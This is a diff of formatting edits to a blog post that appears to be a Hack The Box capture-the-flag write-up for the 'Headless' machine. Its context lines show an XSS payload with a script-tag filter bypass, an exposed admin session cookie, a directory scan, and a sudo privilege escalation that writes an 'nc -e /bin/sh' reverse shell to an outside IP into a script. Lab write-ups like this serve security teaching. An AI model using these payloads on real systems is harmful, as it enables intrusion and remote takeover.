@@ -1,7 +1,7 @@
 ---
 heroImage: /src/assets/images/headless/Headless.png
 category: CTF
-description: '''Hackthebox Season Machine: Headless'''
+description: "'Hackthebox Season Machine: Headless'"
 pubDate: 2024-03-24T23:00:00.000Z
 tags:
   - HTB
@@ -30,7 +30,7 @@ If we click on the 'for questions' button, we get the /support directory
 
 Test if special characters (", ', \<, >) are supported then we also test with SQLi and XSS payloads. It works with xss payload: \</scrip\</script>t>\<img src =q onerror=prompt(8)>
 
-Also notice that we get the admin cookie in the cookie header of the response. InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB\_Zfs
+Also notice that we get the admin cookie in the cookie header of the response. InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
 
 ![](../../assets/images/headless/xss.png)
 
@@ -44,14 +44,14 @@ dirsearch -u http://10.10.11.8:5000
 We have an extra directory /dashboard.
 
 Going to the dashboard page, we see that we are unauthorized to access it
-![](../../assets/images/headless/dashboard.png "dashboard")
+![](../../assets/images/headless/dashboard.png 'dashboard')
 
 What do we have??
 
-* A website running on port 5000
-* XSS on from the /support page with admin cookie exposed in the response
-* dashboard directory we dont have access to
-* Now, Get RCE via XSS using cookie
+- A website running on port 5000
+- XSS on from the /support page with admin cookie exposed in the response
+- dashboard directory we dont have access to
+- Now, Get RCE via XSS using cookie
 
 Using the concept from:[https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e)
 
@@ -101,7 +101,7 @@ We get our low priv shell
 
 ### Privilege Escalation
 
-First thing I typically check is `sudo -l\`, and we have  a hit this time.
+First thing I typically check is `sudo -l\`, and we have a hit this time.
 
 ![](../../assets/images/headless/sduo.png)
 
@@ -111,7 +111,7 @@ We can use the syscheck command without having sudo privileges
 Syscheck is the name of the integrity checking process inside OSSEC.It runs periodically to check if any configured file has changed.
 ```
 
-Checking the content of /usr/bin/syscheck, we see that it is processing  an initdb.sh file. We can add our own inidb.sh file, which will be a payload.
+Checking the content of /usr/bin/syscheck, we see that it is processing an initdb.sh file. We can add our own inidb.sh file, which will be a payload.
 ![](../../assets/images/headless/init.png)
 
 ```
@@ -119,6 +119,7 @@ echo "nc -e /bin/sh 10.10.16.63 4444" > initdb.sh
 chmod +x initdb.sh
 sudo /usr/bin/syscheck
 ```
+
 Run the payload
 ![](../../assets/images/headless/run.png)
 
